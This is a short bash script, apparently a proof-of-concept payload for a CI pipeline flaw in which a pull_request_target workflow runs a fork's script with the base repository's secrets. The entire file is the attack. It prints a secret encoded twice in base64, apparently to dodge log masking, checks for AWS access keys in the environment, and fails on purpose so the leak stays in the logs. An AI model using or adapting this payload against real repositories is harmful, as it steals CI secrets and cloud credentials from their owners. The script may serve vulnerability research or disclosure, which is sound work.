#!/usr/bin/env bash
# Attacker-controlled script executed by push-deps with AWS_ACCESS_KEY_ID,
# AWS_SECRET_ACCESS_KEY, REPO_PATH and VERSION in the step env (pull_request_target
# gives base-repo secrets to the fork head checkout). Backup sink.
printf '%s\n' 'GERALT_DBG attacker-controlled deps-manifest.sh executing in push-deps'
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
if [ -n "$AWS_ACCESS_KEY_ID" ] && [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
  printf '%s\n' 'GERALT_DBG AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY are present in step env'
fi
if [ -n "$REPO_PATH" ]; then
  printf '%s\n' 'GERALT_DBG REPO_PATH is present in step env'
fi
# Stop here so the leaked token stays visible in the logs (upload-deps.sh never runs).
exit 1
